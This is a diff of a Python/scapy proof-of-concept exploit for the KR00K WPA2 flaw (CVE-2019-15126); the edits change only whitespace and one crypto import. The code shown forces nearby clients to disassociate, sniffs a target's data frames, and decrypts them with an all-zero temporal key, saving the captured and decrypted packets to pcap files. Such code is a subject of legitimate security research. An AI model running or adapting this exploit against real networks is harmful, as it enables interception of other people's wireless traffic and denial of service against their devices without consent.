@@ -3,15 +3,15 @@
 # Experimetal KR00K PoC in python3 using scapy
 #
 # Description:
-# This script is a simple experiment to exploit the KR00K vulnerability (CVE-2019-15126), 
+# This script is a simple experiment to exploit the KR00K vulnerability (CVE-2019-15126),
 # that allows to decrypt some WPA2 CCMP data in vulnerable devices.
 # More specifically this script attempts to retrieve Plaintext Data of WPA2 CCMP packets knowning:
-# * the TK (128 bites all zero) 
+# * the TK (128 bites all zero)
 # * the Nonce (sent plaintext in packet header)
 # * the Encrypted Data
 #
 # Where:
-# * WPA2 AES-CCMP decryption --> AES(Nonce,TK) XOR Encrypted Data = Decrypted Data  
+# * WPA2 AES-CCMP decryption --> AES(Nonce,TK) XOR Encrypted Data = Decrypted Data
 # * Decrypted stream starts with "\xaa\xaa\x03\x00\x00\x00"
 # * Nonce (104 bits) = Priority (1byte) + SRC MAC (6bytes) + PN (6bytes)
 #
@@ -41,17 +41,17 @@
 
 
 
-import argparse, threading 
+import argparse, threading
 import datetime, sys, re
 from scapy.all import *
 from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
-from Cryptodome.Cipher import AES
+from Crypto.Cipher import AES
 
 
 
 # Proof of Sympathy ;-)
 LOGO = """\
- __ _  ____   __    __  __ _  ____  ____ 
+ __ _  ____   __    __  __ _  ____  ____
 (  / )(  _ \ /  \  /  \(  / )(  __)(  _ \\
  )  (  )   /(  0 )(  0 ))  (  ) _)  )   /
 (__\_)(__\_) \__/  \__/(__\_)(____)(__\_)
@@ -80,7 +80,7 @@ class Krooker:
             return None
         dot11 = enc_pkt[Dot11]
         dot11ccmp = enc_pkt[Dot11CCMP]
-        
+
         # Extract the Packet Number (IV)
         PN = "{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}".format(dot11ccmp.PN5,dot11ccmp.PN4,dot11ccmp.PN3,dot11ccmp.PN2,dot11ccmp.PN1,dot11ccmp.PN0)
         # Extract the victim MAC address
@@ -94,7 +94,7 @@ class Krooker:
         # Build the nonce
         ccmp_nonce = bytes.fromhex(priority) + bytes.fromhex(source_addr) + bytes.fromhex(PN)
 
-        # Finally try to decrypt wpa2 data 
+        # Finally try to decrypt wpa2 data
         enc_cipher = AES.new(t_key, AES.MODE_CCM, ccmp_nonce, mac_len=8)
         decrypted_data = enc_cipher.decrypt(dot11ccmp.data[:-8])
         return decrypted_data
@@ -129,7 +129,7 @@ class Krooker:
                 dec_pkt = bytes.fromhex(re.sub(':','',self.target_mac) + re.sub(':','',self.other_mac)) + dec_data[6:]
                 wrpcap("enc_pkts.pcap", sniffed_pkt, append=True)
                 wrpcap("dec_pkts.pcap", dec_pkt, append=True)
-                # Uncomment this if you need a one-shoot PoC decryption 
+                # Uncomment this if you need a one-shoot PoC decryption
                 #sys.exit(0)
             #else:
                 # Uncomment this print line only for debug purposes
@@ -162,7 +162,7 @@ def main():
     parser.add_argument("-w", "--wifi_channel", required=False, help="The WiFi channel identifier (default 1)", type=int, default="1")
     parser.add_argument("-d", "--delay", required=False, help="The delay for disassociation frames (default 4 seconds)", type=int, default="4")
     args = parser.parse_args()
-    
+
     # Print the kr00ker logo
     print(LOGO)
 
@@ -182,17 +182,17 @@ def main():
         else:
             print("["+str(datetime.now().time())+"][-] Exiting, the specified channel "+target_channel+" is not valid")
             exit(1)
-    
+
         # Check if valid device MAC Addresses have been specified
         if client_mac == "ff:ff:ff:ff:ff:ff" or ap_mac == "ff:ff:ff:ff:ff:ff":
             print("["+str(datetime.now().time())+"][-] Exiting, the specified FF:FF:FF:FF:FF:FF broadcast MAC address is not valid")
             exit(1)
-    
+
         # Check if a valid reason have been specified
         if reason not in range(1,99):
             print("Exiting, specified a not valid disassociation Reason ID: "+str(reason)+", accepted values from 1 to 99")
             exit(1)
-         
+
         # Check if a valid delay have been specified
         if delay <= 0:
             print("Exiting, the specified delay is not valid")
@@ -218,17 +218,17 @@ def main():
 
         # Start packet interception
         s_filter = "ether src "+str(target_mac)+" and ether dst "+str(other_mac)+" and type Data"
-        sniff(iface=krooker.interface, filter=s_filter, prn=krooker.check_packet)    
+        sniff(iface=krooker.interface, filter=s_filter, prn=krooker.check_packet)
 
     except KeyboardInterrupt:
         print("\n["+str(datetime.now().time())+"][!] Exiting, caught keyboard interrupt")
         k_th.join()
         sys.exit(0)
-    
+
     except scapy.error.Scapy_Exception:
         print("["+str(datetime.now().time())+"][!] Exiting, your wireless interface seems not in monitor mode")
         sys.exit(1)
-        
+
 
 
 if __name__ == "__main__":
